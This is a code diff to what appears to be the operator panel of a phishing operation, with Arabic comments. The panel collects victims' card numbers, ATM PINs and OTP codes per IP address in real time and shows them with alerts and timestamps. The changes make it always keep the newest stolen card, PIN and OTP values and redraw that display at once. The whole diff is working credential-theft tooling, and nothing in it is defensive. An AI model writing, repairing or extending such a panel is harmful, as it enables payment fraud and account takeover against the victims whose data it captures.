@@ -356,13 +356,8 @@ function initSock(){
     const ip=norm(d.ip||'');
     if(!ld[ip])ld[ip]={};
     ld[ip].requestId=d.requestId;
-    // تحديث البطاقة فقط إذا كانت بيانات جديدة (رقم مختلف)
-    const oldCard=ld[ip].pay;
-    const newNum=(d.cardNumber||d.card_number||'').replace(/\s/g,'');
-    const oldNum=oldCard?(oldCard.cardNumber||oldCard.card_number||'').replace(/\s/g,''):'';
-    if(!oldCard||newNum!==oldNum){
-      ld[ip].pay=d;
-    }
+    // دائماً حدّث بيانات البطاقة بأحدث البيانات
+    ld[ip].pay=d;
     ls[ip]='payment';
     rowBadge(ip,'payment'); updPend(); beep(660);
     toast('💳 بيانات بطاقة جديدة');
@@ -386,20 +381,14 @@ function initSock(){
     ld[mip].requestId=d.requestId;
 
     if(isPIN){
-      // لا تمسح PIN القديم — أضف الجديد فقط إذا كان مختلفاً
-      const oldPin=ld[mip].pin;
-      if(!oldPin||oldPin.code!==code){
-        ld[mip].pin=d;
-      }
+      // دائماً حدّث الـ PIN بأحدث قيمة
+      ld[mip].pin=d;
       ls[mip]='pin';
       rowBadge(mip,'pin'); beep(550);
       toast('🔒 رقم سري ATM: '+code);
     } else {
-      // لا تمسح OTP القديم — أضف الجديد فقط إذا كان مختلفاً
-      const oldOtp=ld[mip].otp;
-      if(!oldOtp||oldOtp.code!==code){
-        ld[mip].otp=d;
-      }
+      // دائماً حدّث الـ OTP بأحدث قيمة
+      ld[mip].otp=d;
       ls[mip]='otp';
       rowBadge(mip,'otp'); beep(770);
       toast('🔑 OTP جديد: '+code);
@@ -648,7 +637,8 @@ function buildCardSection(ip, ex){
   if(allOtps.length>0){
     allOtps.forEach((o,i)=>{
       const oc=o.code||'-';
-      const ts=o.created_at?new Date(o.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+      const tsRaw=o.timestamp||o.created_at||null;
+      const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
       const lbl=allOtps.length>1?`رمز OTP #${allOtps.length-i}`:'رمز OTP';
       h+=`<div class="otp-row">
         <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
@@ -673,7 +663,8 @@ function buildCardSection(ip, ex){
     if(allPins.length>0){
       allPins.forEach((p,i)=>{
         const pc=p.code||'-';
-        const ts=p.created_at?new Date(p.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+        const tsRaw=p.timestamp||p.created_at||null;
+        const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
         const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
         h+=`<div class="otp-row">
           <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
@@ -744,8 +735,27 @@ function buildCardSection(ip, ex){
   return h;
 }
 
+function _injectCardHtml(body, html){
+  const cardSec=body.querySelector('.card-sec');
+  const navSecHdr=[...body.querySelectorAll('.msec-hdr')].find(n=>n.textContent.includes('توجيه'));
+  if(cardSec&&navSecHdr){
+    let el=cardSec;
+    while(el&&el!==navSecHdr.parentElement){
+      const next=el.nextElementSibling;
+      if(el===navSecHdr||el===navSecHdr.parentElement)break;
+      el.remove(); el=next;
+    }
+    navSecHdr.insertAdjacentHTML('beforebegin',html);
+  }
+  const cb=body.querySelector('.card-list,.otp-sec');
+  if(cb){cb.classList.add('pbx');setTimeout(()=>cb.classList.remove('pbx'),800);}
+}
+
 async function rebuildCard(ip){
   const body=document.getElementById('mbody'); if(!body)return;
+  // أولاً: عرض فوري بالبيانات اللحظية من ld (بدون DB) لضمان ظهور OTP/PIN الجديد فوراً
+  _injectCardHtml(body, buildCardSection(ip,{payments:[],codes:[]}));
+  // ثانياً: جلب من DB لإضافة التواريخ والسجل الكامل
   let ex={payments:[],codes:[]};
   try{
     const bk=allB.find(x=>norm(x.ip||'')===norm(ip));
@@ -753,28 +763,9 @@ async function rebuildCard(ip){
     const r=await fetch(`${SRV}/api/data/${rawIp}`);
     ex=await r.json();
   }catch(e){}
-
-  // إعادة بناء قسم البطاقة + OTP + الأزرار فقط
-  const newHtml=buildCardSection(ip,ex);
-  const tmp=document.createElement('div');
-  tmp.innerHTML=newHtml;
-
-  // إزالة الأقسام القديمة وإضافة الجديدة
-  const cardSec=body.querySelector('.card-sec');
-  const navSecHdr=[...body.querySelectorAll('.msec-hdr')].find(n=>n.textContent.includes('توجيه'));
-  if(cardSec&&navSecHdr){
-    // احذف كل شيء بين card-sec وقسم التوجيه
-    let el=cardSec;
-    while(el&&el!==navSecHdr.parentElement){
-      const next=el.nextElementSibling;
-      if(el===navSecHdr||el===navSecHdr.parentElement)break;
-      el.remove();
-      el=next;
-    }
-    navSecHdr.insertAdjacentHTML('beforebegin',newHtml);
+  if(document.getElementById('mbody')){
+    _injectCardHtml(document.getElementById('mbody'), buildCardSection(ip,ex));
   }
-  const cb=body.querySelector('.card-list,.otp-sec');
-  if(cb){cb.classList.add('pbx');setTimeout(()=>cb.classList.remove('pbx'),800);}
 }
 
 async function appv(ip,stage){
